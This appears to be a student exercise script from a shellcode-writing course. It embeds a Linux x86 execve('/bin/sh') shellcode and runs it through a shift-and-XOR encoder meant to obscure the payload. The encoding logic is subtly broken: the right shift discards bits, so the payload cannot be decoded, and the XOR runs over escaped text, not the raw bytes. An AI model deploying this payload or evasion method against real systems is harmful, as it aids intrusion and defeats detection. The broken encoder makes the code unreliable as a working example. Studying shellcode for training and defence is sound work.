#!/usr/bin/env python

#-----------------------------------------------------------------------------
#
# encoder.py
# by Michael Born (@blu3gl0w13)
# Student-ID: SLAE-744
# September 5, 2016
#
#----------------------------------------------------------------------------


# handle our imports

import sys



shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encshellcode = ""
encshellcode2 = ""
xorencshellcode = ""
xorencshellcode2 = ""

for i in bytearray(shellcode):

  x = i >> 2
  encshellcode += "\\x%02x," % x
  encshellcode2 += "0x%02x," % x

for y in bytearray(encshellcode):

  a = y ^ 0xad
  xorencshellcode += "\\x%02x," % a
  xorencshellcode2 += "0x%02x," % a

print "Encoded Shellcode: %s\n" % encshellcode
print "Encoded Shellcode 2: %s\n\n" % encshellcode2

print "XOR Shifted Shellcode: %s\n" % xorencshellcode
print "XOR Shifted Shellcode: %s\n\n" % xorencshellcode2
